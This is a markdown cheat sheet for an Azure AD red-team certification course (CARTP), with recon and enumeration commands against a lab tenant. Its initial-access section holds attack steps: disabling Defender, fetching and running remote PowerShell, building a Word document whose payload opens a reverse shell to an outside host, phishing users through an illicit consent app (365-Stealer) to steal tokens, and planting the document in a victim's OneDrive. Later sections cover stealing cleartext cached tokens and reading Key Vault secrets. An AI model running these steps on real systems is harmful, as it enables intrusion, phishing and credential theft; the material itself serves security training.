# CARTP-cheatsheet
Azure AD cheatsheet for the CARTP course

## General information
### Terminology
- Tenant - An instance of Azure AD and represents a single organization.
- Azure AD Directory - Each tenant has a dedicated Directory. This is used to perform identity and access management functions for resources. 
- Subscriptions - It is used to pay for services. There can be multiple subscriptions in a Directory.
- Core Domain - The initial domain name <tenant>.onmicrosoft.com is the core domain. it is possible to define custom domain names too.
- Azure resourced are divided into four levels:
  - Management groups
    - Management groups are used to manage multiple subscriptions. 
    - All subscriptions inherit the conditions applied to the management group. 
    - All subscriptions within a single management group belong to the same Azure tenant.
    - A management group can be placed in a lower hierarchy of another management group.
    - There is a single top-level management group - Root management group - for each directory in Azure.
  - Subscriptions
    - An Azure subscription is a logical unit of Azure services that links to an Azure account. 
    - An Azure subscription is a billing and/or access control boundary in an Azure AD Directory. 
    - An Azure AD Directory may have multiple subscriptions but each subscription can only trust a single directory.
    - An Azure role applied at the subscription level applies to all the resources within the subscription.
  - Resource groups
    - A resource group acts as a container for resources. 
    - In Azure, all the resources must be inside a resource group and can belong only to a group. 
    - If a resource group is deleted, all the resources inside it are also deleted. 
    - A resource group has its own Identity and Access Management settings for providing role based access. An Azure role applied to the resource group applied to all the resources in the group.
  - Resources
    - A resource is a deployable item in Azure like VMs, App Services, Storage Accounts etc. 
- Managed identity
  - Azure provides the ability to assign Managed Identities to resources like app service, function apps, virtual machines etc. 
  - Managed Identity uses Azure AD tokens to access other resources (like key vaults, storage accounts) that support Azure AD authentication. 
  - It is a service principal of special type that can be used with Azure resources. 
  - Managed Identity can be system-assigned (tied to a resource and cannot be shared with other resources) or user-assigned (independent life cycle and can be share across resources).
-Azure Resource manager
  - It is the client neutral deployment and management service for Azure that is used for lifecycle management (creating, updating and deleting) and access control of of resources.
  - ARM templates can be used for consistent and dependency-defined redeployment of resources.
- Note: A global administration can always elevate their privileges to the Root management group

# General
#### Access C disk of a computer (check local admin)
```
ls \\<COMPUTERNAME>\c$
```

#### Use this parameter to not print errors powershell
```
-ErrorAction SilentlyContinue
```

#### Rename powershell windows
```
$host.ui.RawUI.WindowTitle = "<NAME>"
```

# Recon
### Manually
#### Get tenant name and fedaration (If azure tenant is in use)
```
https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1
https://login.microsoftonline.com/getuserrealm.srf?login=root@defcorphq.onmicrosoft.com&xml=1
```

#### Get the Tenant ID
```
https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration
https://login.microsoftonline.com/defcorphq.onmicrosoft.com/.well-known/openid-configuration
```
### AADinternals
https://github.com/Gerenios/AADInternals
https://o365blog.com/aadinternals/
#### Import the AADinternals module
```
import-module .\AADInternals.psd1
```

####  Get tenant name, authentication, brand name (usually same as directory name) and domain name
```
Get-AADIntLoginInformation -UserName root@defcorphq.onmicrosoft.com
```

#### Get tenant ID
```
Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com
```

#### Get tenant domains
```
Get-AADIntTenantDomains -Domain defcorphq.onmicrosoft.com 
Get-AADIntTenantDomains -Domain deffin.onmicrosoft.com
```

#### Get all the information
```
Invoke-AADIntReconAsOutsider -DomainName defcorphq.onmicrosoft.com
```

#### Check for Email ID's
https://github.com/LMGsec/o365creeper

Could gather list of emails from something like harvester or hunter.io or smth and validate them!
```
python o365creeper.py -f list_of_emails.txt -o validemails.txt
```

#### Enumerate used services
- https://github.com/NetSPI/MicroBurst
- Edit the permutations.txt to add permutations such as career, hr, users, file and backup
```
Import-Module MicroBurst.psm1 -Verbose
Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose -Outputfile subdomains.txt
```

#### Enumerate Azureblobs
- add permutations to permutations.txt like common, backup, code in the misc directory.
```
Import-Module ./Microburst.psm1
Invoke-EnumerateAzureBlobs -Base defcorp -OutputFile azureblobs.txt
```

# Initial access attacks
## Password spray
- https://github.com/dafthack/MSOLSpray
- https://github.com/ustayready/fireprox
```
Import-Module .\MSOLSpray.ps1
```

## Illicit Consent Grant
#### Create a application
- Login to the Azure portal and in the left menu go to 'Azure Active Directory' --> 'App registrations' and click 'new registration'
- Set a application name and choose 'Accounts in any organizational directory (Any Azure AD Directory - Multitenant'
- Use the URL of the student VM in the URI (https://172.16.151.x/login/authorized)
- In the left menu go to 'Certificates & Secrets' and create a new client secret and copy it.
- In the left menu go to 'API permissions' and add the 'user.read' and 'User.ReadBasic.All' for the Microsoft Graph.

#### Check if users are allowed to consent to apps
```
Import-Module AzureADPreview.psd1

#Use another tenant account
$passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole

#output should be
ManagePermissionGrantsForSelf.microsoft-user-default-legacy
```

#### Setup the 365-stealer
- Copy the 365-stealer directory to the xampp directory
- Edit the 365-stealer.py and edit the CLIENTID (client application id), REDIRECTEDURL and CLIENTSECRET (From the certificate)

#### Start the 365-stealer
```
&"C:\Program Files\Python38\python.exe" C:\xampp\htdocs\365-Stealer\365-Stealer.py --run-app
```

#### Get the phishinglink
- Browse to https://localhost and click on readmore. Copy the link!

#### Enumerating applications to send the phishing link
- Edit the permutations.txt to add permutations such as career, hr, users, file and backup
```
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1
Invoke-EnumerateAzureSubDomains -Base defcorphq –Verbose
```

#### Get the access tokens
- Browse to http://localhost:82/365-Stealer/yourvictims/
- Click on the user and copy the access token from access_token.txt
- See the "Using Azure tokens" section

#### Get admin consent
```
- In the left menu go to 'API permissions' and add the mail.read, notes.read.all, mailboxsettings.readwrite, files.readwrite.all, mail.send to Microsoft Graph.
- Refish the user to get a token with the extra permissions
```

#### Create a malicious word document from a licensed vm
```
$passwd = ConvertTo-SecureString "ForCreatingWordDocs@123" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("office-vm\administrator", $passwd)
$officeVM = New-PSSession -ComputerName 172.16.1.250 -Credential $creds
Enter-PSSession -Session $officeVM
Set-MpPreference -DisableRealtimeMonitoring $true

#Generate document
iex (New-Object Net.Webclient).downloadstring("http://172.16.150.38:82/Out-Word.ps1")
Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('http://172.16.150.38:82/Invoke-PowerShellTcp.ps1');reverse -Reverse -IPAddress 172.16.150.38 -Port 4444" -OutputFile student38.doc

#Copy document
exit
Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\studentx.doc -Destination C:\AzAD\Tools\studentx.doc
```

#### Start a listener
```
C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444
```

#### Abuse the access token - Uploading word doc to OneDrive
```
cd C:\xampp\htdocs\365-Stealer\

& 'C:\Program Files\Python38\python.exe' 365-Stealer.py --upload C:\AzAD\Tools\studentx.doc --token-path C:\xampp\htdocs\365-Stealer\yourVictims\MarkDWalden@defcorphq.onmicrosoft.com\access_token.txt
```

## Insecure file upload
- Upload a webshell to a insecure webapp
- If command execution is possible execute command ```env```
- if the app service contains environment variables IDENITY_HEADER and IDENTITY_ENDPOINT, it has a managed identity.
- Get access token from managed identity using another webshell. Upload studentxtoken.phtml

## Server Side Template Injection
- SSTI allows an attacker to abuse template syntax to inject payloads in a template that is executed on the server side. 
- That is, we can get command execution on a server by abusing this.
- Find we webapp which is vulnerable, test with injectin a expression ```{{7*7}}``` and see if it gets evaluated.
- The way expression is evaluated means that, most probably, either PHP or Python is used for the web app. We may need to run some trial and error methods to find out the exact language and template framework. 
- Use ```{{config.items()}}``` and see if it works.
- Check if a managed identity is assigned (Check for the env variables IDENTITY_HEADER and IDENTITY_ENDPOINT)

## OS Command injection
- In case of OS command injection, it is possible to run arbitrary operating  system commands on the server where requests are processed. 
- This is usually due to insecure parsing of user input such as parameters, uploaded files and HTTP requests. 

## Storage account
#### Enumerate Azureblobs
- add permutations to permutations.txt like common, backup, code in the misc directory.
```
Import-Module ./Microburst.psm1
Invoke-EnumerateAzureBlobs -Base defcorp
```
- Access the URL's and see if any files are listed (Example https://defcorpcommon.blob.core.windows.net/backup?restype=container&comp=list)
- Access the files by adding it to the url (Example https://defcorpcommon.blob.core.windows.net/backup/blob_client.py)
- Check for a SAS URL, if found then open the "Connect to Azure Storage", select "blobl container" and select 'Shared Access Signatur (SAS)' and paste the URL, displayname will fill automatically.

# Authenticated enumeration
## Enumeration through Azure portal
#### Login azure portal
Login to the azure portal with successfull attacks https://portal.azure.com/

#### Enumerate users, groups, devices, directory roles, enterprise applications
- Open the left menu --> Azure Active directory and click check the users, groups, Roles and administrators, Enterprise Application and devices tab.
- Also worth checking the "App services" and "Virtual machines" 

## Enumeration using AzureAD Module
- https://www.powershellgallery.com/packages/AzureAD
- Rename .nukpkg to .zip and extract it
```
Import-Module AzureAD.psd1
```

#### Connect to Azure AD
```
$creds = Get-Credential
Connect-AzureAD -Credential $creds
```

```
$passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
```

#### Get the current session state
```
Get-AzureADCurrentSessionInfo
```

#### Get the details of the current tenant
```
Get-AzureADTenantDetail
```

### User enumeration
#### Enumerate all users
```
Get-AzureADUser -All $true
Get-AzureADUser -all $true | Select-Object UserPrincipalName, Usertype
```

#### Enumerate a specific user
```
Get-AzureADUser -ObjectId test@defcorphq.onmicrosoft.com
```

#### Search for a user based on string in first characters of displayname (Wildcard not supported)
```
Get-AzureADUser -SearchString "admin"
```

#### Search for user who contain the word "admin" in their displayname
```
Get-AzureADUser -All $true |?{$_.Displayname -match "admin"}
```

#### List all the attributes for a user
```
Get-AzureADUser -ObjectId test@defcorphq.onmicrosoft.com | fl * 

Get-AzureADUser -ObjectId test@defcorphq.onmicrosoft.com | %{$_.PSObject.Properties.Name} 
```

#### Search attributes for all users that contain the string "password" 
```
Get-AzureADUser -All $true |%{$Properties = $_;$Properties.PSObject.Properties.Name | % {if ($Properties.$_ -match 'password') {"$($Properties.UserPrincipalName) - $_ - $($Properties.$_)"}}}
```

#### All users who are synced from on-prem
```
Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null} 
```

#### All users who are from Azure AD
```
Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
```

#### Get objects created by any user (use -objectid for a specific user)
```
Get-AzureADUser | Get-AzureADUserCreatedObject
```

#### Objects owned by a specific user
```
Get-AzureADUserOwnedObject -ObjectId test@defcorphq.onmicrosoft.com
```

### Group enumeration
#### List all groups
```
Get-AzureADGroup -All $true
```

#### Enumerate a specific group
```
Get-AzureADGroup -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e
```

#### Search for a group based on string in first characters of DisplayName (wildcard not supported)
```
Get-AzureADGroup -SearchString "admin" | fl * 
```

#### To search for a group which contains the word "admin" in their name
```
Get-AzureADGroup -All $true |?{$_.Displayname -match "admin"}
```

#### Get groups that allow Dynamic membership (note the cmdlet name)
```
Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'} 
```

#### All groups that are synced from on-prem (note that security groups are not synced)
```
Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
```

#### All groups that are from Azure AD
```
Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
```

#### Get members of a group
```
Get-AzureADGroupMember -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e
```

#### Get groups and roles where the specified user is a member
```
Get-AzureADUser -SearchString 'test' | Get-AzureADUserMembership
Get-AzureADUserMembership -ObjectId test@defcorphq.onmicrosoft.com
```

### Role enumeration
#### Get all available role templates
```
Get-AzureADDirectoryroleTemplate
```

#### Get all roles
```
Get-AzureADDirectoryRole
```

#### Enumerate users to whom roles are assigned (Example of the Global Administrator role)
```
Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
```

### List custom roles
```
Import-Module .\AzureADPreview.psd1
$creds = Get-Credential
Connect-AzureAD -Credential $creds

Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
```

### Devices enumeration
#### Get all Azure joined and registered devices
```
Get-AzureADDevice -All $true | fl *
```

#### Get the device configuration object (Note to the registrationquota in the output)
```
Get-AzureADDeviceConfiguration | fl *
```

#### List Registered owners of all the devices
```
Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredOwner
```

#### List Registered user of all the devices
```
Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredUser
```

#### List devices owned by a user
```
Get-AzureADUserOwnedDevice -ObjectId michaelmbarron@defcorphq.onmicrosoft.com
```

#### List deviced registered by a user
```
Get-AzureADUserRegisteredDevice -ObjectId michaelmbarron@defcorphq.onmicrosoft.com 
```

#### List deviced managed using Intune
```
Get-AzureADDevice -All $true | ?{$_.IsCompliant -eq "True"} 
```

### App enumeration
#### Get all application objects registered using the current tenant.
```
Get-AzureADApplication -All $true
```

#### Get all details about an application
```
Get-AzureADApplication -ObjectId a1333e88-1278-41bf-8145-155a069ebed0 | fl *
```

#### Get an application based on the display name
```
Get-AzureADApplication -All $true | ?{$_.DisplayName -match "app"}
```

#### Show application with a application password (Will not show passwords)
```
Get-AzureADApplicationPasswordCredential 
```

#### Get the owner of a application
```
Get-AzureADApplication -ObjectId a1333e88-1278-41bf-8145-155a069ebed0 | Get-AzureADApplicationOwner | fl *
```

#### Get apps where a user has a role (exact role is not shown)
```
Get-AzureADUser -ObjectId roygcain@defcorphq.onmicrosoft.com | Get-AzureADUserAppRoleAssignment | fl * 
```

#### Get apps where a group has a role (exact role is not shown)
```
Get-AzureADGroup -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e | Get-AzureADGroupAppRoleAssignment | fl *
```

### Service-principals enumeration
Enumerate Service Principals (visible as Enterprise Applications in Azure Portal). Service principal is local representation for an app in a specific tenant and it is the security object that has privileges. This is the 'service account'! Service Principals can be assigned Azure roles.

#### Get all service principals
```
Get-AzureADServicePrincipal -All $true
```

#### Get all details about a service principal
```
Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | fl *
```

#### Get a service principal based on the display name
```
Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -match "app"}
```

#### Get owners of a service principal
```
Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | Get-AzureADServicePrincipalOwner | fl *
```

#### Get objects owned by a service principal
```
Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | Get-AzureADServicePrincipalOwnedObject
```

#### Get objects created by a service principal
```
Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | Get-AzureADServicePrincipalCreatedObject
```

#### Get group and role memberships of a service principal
```
Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | Get-AzureADServicePrincipalMembership | fl * 

Get-AzureADServicePrincipal | Get-AzureADServicePrincipalMembership
```

## Enumeration using Az powershell
#### Install module
```
Install-Module Az
```

#### List all az commands
```
Get-Command -Module Az.*
```

#### List cmdlets for Az AD powershell (\*Azad format\*)
```
Get-Command *aZad*
```

#### List all cmdlets for Azure resources (\*Az format\*)
```
Get-Command *aZ*
```

#### List all cmdlets for a particular resource
```
Get-Command *azvm*
Get-Command -Noun *vm* -Verb Get
Get-Command *vm*
```

#### Get the information about the current context (Account, Tenant, Subscription etc).
```
Get-AzContext
```

#### List available contexts
```
Get-AzContext -ListAvailable
```

#### Enumerate subscriptions accessible by the current user
```
Get-AzSubscription
```

#### List info on the current user
```
az ad signed-in-user show
```

#### Enumerate all resources visible to the current user
- Error 'this.Client.SubscriptionId' cannot be null' means the managed identity has no rights on any of the Azure resources.
```
Get-AzResource
Get-AzResource | select-object Name, Resourcetype
```

#### Enumerate all Azure RBAC role assignments
```
Get-AzRoleAssignment
```

#### Get role assignment of a specific id
```
Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation
```

#### Enumerate all users
```
Get-AzADUser
```

#### Enumerate a specific user
```
Get-AzADUser -UserPrincipalName test@defcorphq.onmicrosoft.com
```

#### Search for a user based on string in first character of displayname (Wildcard not supported)
```
Get-AzADUser -SearchString "admin" 
```

#### Search for a user who contain the word "admin" in their displayname:
```
Get-AzADUser |?{$_.Displayname -match "admin"}
```

#### List all groups
```
Get-AzADGroup
```

#### Enumerate a specific group
```
Get-AzADGroup -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e
```

#### Search for a group based on string in first characters of displayname (wildcard not supported)
```
Get-AzADGroup -SearchString "admin" | fl * 
```

#### To search for groups which contain the word "admin" in their name:
```
Get-AzADGroup |?{$_.Displayname -match "admin"}
```

#### Get members of a group
```
Get-AzADGroupMember -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e
```

####  Get all the application objects registered with the current tenant (visible in App  Registrations in Azure portal). An application object is the global representation of an app. 
```
Get-AzADApplication
```

#### Get all details about an application
```
Get-AzADApplication -ObjectId a1333e88-1278-41bf-8145-155a069ebed0
```

#### Get an application based on the display name
```
Get-AzADApplication | ?{$_.DisplayName -match "app"}
```

#### Get all service principals
```
Get-AzADServicePrincipal
```

#### Get all details about a service principal
```
Get-AzADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264
```

#### Get an service principal based on the display name
```
Get-AzADServicePrincipal | ?{$_.DisplayName -match "app"} 
```

#### List all VM's the user has access to
```
Get-AzVM 
Get-AzVM | fl
```

#### Get all function apps
```
Get-AzFunctionApp
```

#### Get all webapps
```
Get-AzWebApp
Get-AzWebApp | select-object Name, Type, Hostnames
```

#### List all storage accounts
```
Get-AzStorageAccount
Get-AzStorageAccount | fl
```

#### List all keyvaults
```
Get-AzKeyVault
```

#### Get info about a specific keyvault
```
Get-AzKeyVault -VaultName ResearchKeyVault
```

#### List the saved creds from keyvault
```
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -AsPlainText
```

#### Read creds from a keyvault
```
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
```

## Enumeration using Azure CLI
- Install https://docs.microsoft.com/en-us/cli/azure/install-azure-cli
- Accessible in the cloud shell to

#### Login
```
az login

az login -u test@defcorphq.onmicrosoft.com -p SuperVeryEasytoGuessPassword@1234 
```

#### Configure default behavior (Output type, location, resource group etc)
```
az configure
```

#### Find popular commands
```
az find "vm"

az find "az vm"

az find "az vm list" 
```

#### List all users
Use the --output parameter to change the output layout, default is json
```
az ad user list --output table
```

#### List only the userPrincipalName and givenName
Second command renames properties
```
az ad user list --query "[].[userPrincipalName,displayName]" --output table

az ad user list --query "[].{UPN:userPrincipalName, Name:displayName}" --output table
```

#### We can use JMESPath query on the results of JSON output. Add --query-examples at the end of any command to see examples
```
az ad user show list --query-examples 
```

#### Get details of the current tenant
```
az account tenant list
```

#### Get details of the current subscription
```
az account subscription list
```

#### List the current signed-in user
```
az ad signed-in-user show
```

#### List all owned objects by user
```
az ad signed-in-user list-owned-objects
```

#### Enumerate all users
```
az ad user list
az ad user list --query "[].[displayName]" -o table
```

#### Enumerate a specific user
```
az ad user show --id test@defcorphq.onmicrosoft.com
```

#### Search for users who contain the word "admin" in their Display name (case sensitive):
```
az ad user list --query "[?contains(displayName,'admin')].displayName"
```

#### When using PowerShell, search for users who contain the word "admin" in their Display name. This is NOT case-sensitive:
```
az ad user list | ConvertFrom-Json | %{$_.displayName -match "admin"}
```

#### List all users who are synced from on-prem
```
az ad user list --query "[?onPremisesSecurityIdentifier!=null].displayName"
```

#### All users who are from Azure AD
```
az ad user list --query "[?onPremisesSecurityIdentifier==null].displayName"
```

#### List all groups
```
az ad group list 
az ad group list --query "[].[displayName]" -o table
```

#### Enumerate a specific group using display name or object id
```
az ad group show -g "VM Admins" 
az ad group show -g 783a312d-0de2-4490-92e4-539b0e4ee03e
```

#### Search for groups that contain the word "admin" in their Display name (case sensitive) - run from cmd:
```
az ad group list --query "[?contains(displayName,'admin')].displayName"
```

#### When using PowerShell, search for groups that contain the word "admin" in their Display name. This is NOT case-sensitive:
```
az ad group list | ConvertFrom-Json | %{$_.displayName -match "admin"}
```

#### All groups that are synced from on-prem
```
az ad group list --query "[?onPremisesSecurityIdentifier!=null].displayName"
```

#### All groups that are from Azure AD
```
az ad group list --query "[?onPremisesSecurityIdentifier==null].displayName"
```

#### Get members of a group
```
az ad group member list -g "VM Admins" --query "[].[displayName]" -o table 
```

#### Check if user is member of the specified group
```
az ad group member check --group "VM Admins" --member-id b71d21f6-8e09-4a9d-932a-cb73df519787
```

#### Get the object IDs of the groups of which the specified group is a member
```
az ad group get-member-groups -g "VM Admins"
```

#### Get all the application objects registered with the current tenant
```
az ad app list
az ad app list --query "[].[displayName]" -o table
```

#### Get all details about an application using identifier uri, application id or object id
```
az ad app show --id a1333e88-1278-41bf-8145-155a069ebed0
```

#### Get an application based on the display name (Run from cmd)
```
az ad app list --query "[?contains(displayName,'app')].displayName"
```

#### When using PowerShell, search for apps that contain the word "slack" in their Display name. This is NOT case-sensitive:
```
az ad app list | ConvertFrom-Json | %{$_.displayName -match "app"}
```

#### Get owner of an application
```
az ad app owner list --id a1333e88-1278-41bf-8145-155a069ebed0 --query "[].[displayName]" -o table
```

#### List apps that have password credentials
```
az ad app list --query "[?passwordCredentials != null].displayName" 
```

#### List apps that have key credentials
```
az ad app list --query "[?keyCredentials != null].displayName" 
```

#### Get all service principal names
```
az ad sp list --all
az ad sp list -all --query "[].[displayName]" -o table
```

#### Get all details about a service principal
```
az ad sp show --id cdddd16e-2611-4442-8f45-053e7c37a264
```

#### Get a service principal based on the display name
```
az ad sp list --all --query "[?contains(displayName,'app')].displayName"
```

#### When using PowerShell, search for service principals that contain the word "slack" in their Display name. This is NOT case-sensitive:
```
az ad sp list --all | ConvertFrom-Json | %{$_.displayName -match "app"}
```

#### Get owner of a service principal
```
az ad sp owner list --id cdddd16e-2611-4442-8f45-053e7c37a264 --query "[].[displayName]" -o table
```

#### Get service principal owned by the current user
```
az ad sp list --show-mine
```

#### List apps that have password credentials
```
az ad sp list --all --query "[?passwordCredentials != null].displayName"
```

#### List apps that have key credentials
```
az ad sp list -all --query "[?keyCredentials != null].displayName"
```

#### List all the vm's
```
az vm list
az vm list --query "[].[name]" -o table
```

#### List all app services
```
az webapp list
az webapp list --query "[].[name]" -o table
```

#### List function apps
```
az functionapp list
az functionapp list --query "[].[name]" -o table
```

#### list the readable keyvaults
```
az keyvault list
```

#### List storage accounts
```
az storage account list
```



## Using Azure tokens
- Both Az PowerShell and AzureAD modules allow the use of Access tokens for authentication.
- Usually, tokens contain all the claims (including that for MFA and Conditional Access etc.) so they are useful in bypassing such security controls.
#### Request access token
```
Get-AzAccessToken
(Get-AzAccessToken).Token
```

#### Request an access token for AAD Graph to access Azure AD. 
Supported tokens - AadGraph, AnalysisServices, Arm, Attestation, Batch, DataLake, KeyVault, OperationalInsights, ResourceManager, Synapse
```
Get-AzAccessToken -ResourceTypeName AadGraph
```

#### Request token for microsoft graph
```
(Get-AzAccessToken -Resource "https://graph.microsoft.com").Token
```

### Using tokes with CLI Tools - AZ PowerShell
#### Use the access token
```
Connect-AzAccount -AccountId test@defcorphq@onmicrosoft.com -AccessToken eyJ0eXA...
```

#### Use other access token
- In the below command, use the one for AAD Graph (access token is still required) for accessing Azure AD
- To access something like keyvault you need to get the access token for it before you can access it.
```
Connect-AzAccount -AccountId test@defcorphq@onmicrosoft.com -AccessToken eyJ0eXA... -GraphAccessToken eyJ0eXA...
Connect-AzAccount -AccountId test@defcorphq@onmicrosoft.com -AccessToken eyJ0eXA... 
Connect-AzAccount -AccountId test@defcorphq@onmicrosoft.com -AccessToken eyJ0eXA... -Tenantid <Tenant ID>
```

### Using tokes with CLI Tools - az cli
az cli can request a token but cannot use it!

#### Request an access token (ARM)
```
az account get-access-token
```

#### Request a token for azure graph
```
az account get-access-token --resource-type aad-graph
```

#### Request an access token
Supported tokens - aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
```
az account get-access-token --resource-type ms-graph 
```

### Stealing tokens from az cli
- az cli stores access tokens in clear text in ```accessTokens.json``` in the directory ```C:\Users\<username>\.Azure```
- We can read tokens from the file, use them and request new ones too!
- azureProfile.json in the same directory contains information about subscriptions. 
- You can modify accessTokens.json to use access tokens with az cli but better to use with Az PowerShell or the Azure AD module.
- To clear the access tokens, always use az logout

### Stealing tokens from az powershell
- Az PowerShell stores access tokens in clear text in ```TokenCache.dat``` in the directory ```C:\Users\<username>\.Azure```
- It also stores ServicePrincipalSecret in clear-text in AzureRmContext.jsonif a service principal secret is used to authenticate. 
- Another interesting method is to take a process dump of PowerShell and looking for tokens in it!
- Users can save tokens using Save-AzContext, look out for them! Search for Save-AzContext in PowerShell console history!
- Always use Disconnect-AzAccount!!

### Using tokes with AzureAD module
- AzureAD module cannot request a token but can use one for AADGraph or Microsoft Graph!
- To be able to interact with Azure AD, request a token for the aad-graph.

#### Connecting with AzureAD
```
Connect-AzureAD -AccountId test@defcorphq@onmicrosoft.com -AadAccessToken eyJ0eXA...
Connect-AzureAD -AccountId <ID> -AadAccessToken $token -TenantId <TENANT ID>
```

### Using tokens with API's - management
- The two REST APIs endpoints that are most widely used are
  – Azure Resource Manager - management.azure.com
  – Microsoft Graph - graph.microsoft.com (Azure AD Graph which is deprecated is graph.windows.net)
- Let's have a look at super simple PowerShell codes for using the APIs

#### Get an access token and use it with ARM API. For example, list all the subscriptions
```
$Token = 'eyJ0eXAi..'
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```

#### Get an access token for MS Graph. For example, list all the users
```
$Token = 'eyJ0eXAi..'
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```

### Abusing tokens
#### Check the resources available to the managed identity
Throws an error and nikil is unsure why
```
$token = 'eyJ0eX...'

Connect-AzAccount -AccessToken $token -AccountId <clientID> Get-AzResource
```

#### Use the Azure REST API to get the subscription id
```
$Token = 'eyJ0eX..'
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value
```

#### List all the resources available by the managed identity to the app service
```
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value
```

#### Check what actions are allowed to the vm
- The runcommand privileges lets us execute commands on the VM
```
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'

$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}

(Invoke-RestMethod @RequestParams).value
```

#### List all enterprise applications
```
$Token = 'ey..'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
  Method = 'GET'
  Uri = $URI
  Headers = @{
    'Authorization' = "Bearer $Token"
  }
}
(Invoke-RestMethod @RequestParams).value
```

#### Check if secrets (application passwords) can be added to all enterprise applications
```
. .\Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $graphtoken -Verbose
```

### Enumerating Azure AD environments!
https://github.com/dirkjanm/ROADtools
- Enumeration using RoadRecon includes three steps
  – Authentication
  – Data Gathering
  – Data Exploration
  
####  roadrecon supports username/password, access and refresh tokens, device code flow (sign-in from another device) and PRT cookie.
```
cd C:\AzAD\Tools\ROADTools
pipenv shell 
roadrecon auth -u test@defcorphq.onmicrosoft.com -p SuperVeryEasytoGuessPassword@1234
```

#### Gather information
```
roadrecon gather
```

#### Start roadrecon gui
```
roadrecon gui
```

### Stormspotter
https://github.com/Azure/Stormspotter

#### Start the backend service
```
cd C:\AzAD\Tools\stormspotter\backend\
pipenv shell
python ssbackend.pyz
```

#### Start the frontend server
```
cd C:\AzAD\Tools\stormspotter\frontend\dist\spa\
quasar.cmd serve -p 9091 --history
```

#### Collect data
```
cd C:\AzAD\Tools\stormspotter\stormcollector\
pipenv shell
az login -u test@defcorphq.onmicrosoft.com -p SuperVeryEasytoGuessPassword@1234
python C:\AzAD\Tools\stormspotter\stormcollector\sscollector.pyz cli 
```

#### Check data
- Log-on to the webserver at http://localhost:9091. creds = neo4j:BloodHound
- After login, upload the ZIP archive created by the collector.
- Use the built-in queries to visualize the data.

### Bloodhound / Azurehound
https://github.com/BloodHoundAD/AzureHound

#### Run the collector to collect data
```
import-module .\AzureAD.psd1

$passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd) 
Connect-AzAccount -Credential $creds
Connect-AzureAD -Credential $creds


. C:\AzAD\Tools\AzureHound\AzureHound.ps1
Invoke-AzureHound -Verbose
```

